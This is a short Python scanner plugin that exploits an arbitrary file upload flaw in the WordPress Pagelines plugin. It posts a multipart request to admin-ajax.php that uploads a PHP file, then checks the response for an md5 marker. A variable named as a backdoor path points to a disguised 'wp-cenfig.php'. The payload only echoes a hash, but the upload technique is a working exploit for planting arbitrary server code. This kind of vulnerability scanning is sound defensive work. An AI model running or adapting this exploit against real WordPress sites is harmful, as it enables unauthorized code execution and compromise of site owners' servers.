# !/usr/bin/dev python
# -*- coding:utf-8 -*-
#_Author_= 7d0y
#_PlugName_ = WordPress Pagelines Arbitrary File Upload
#_FileName_ = Pagelines.py
#_Refer= http://www.freebuf.com/vuls/57594.html

import sys
import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload='wp-admin/admin-ajax.php?action=test&page=pagelines'  
    data = '''------WebKitFormBoundary1Ja5UxAmMrAAwPGM
Content-Disposition: form-data; name="settings_upload"

settings
------WebKitFormBoundary1Ja5UxAmMrAAwPGM
Content-Disposition: form-data; name="file"; filename="Settingssettings.txt"
Content-Type: text/plain

<?php
echo md5(1);
die();
?>
------WebKitFormBoundary1Ja5UxAmMrAAwPGM
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundary1Ja5UxAmMrAAwPGM--
'''
    header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1Ja5UxAmMrAAwPGM"
    uploader_url = arg + payload
    bockdoor_url = arg + 'wp-content/wp-cenfig.php'
    code, head, res, _, _ = curl.curl('-H "%s" -d "%s" "%s"' % (header, data, uploader_url))
    if code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(uploader_url)

    
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://192.168.0.151/')[1])
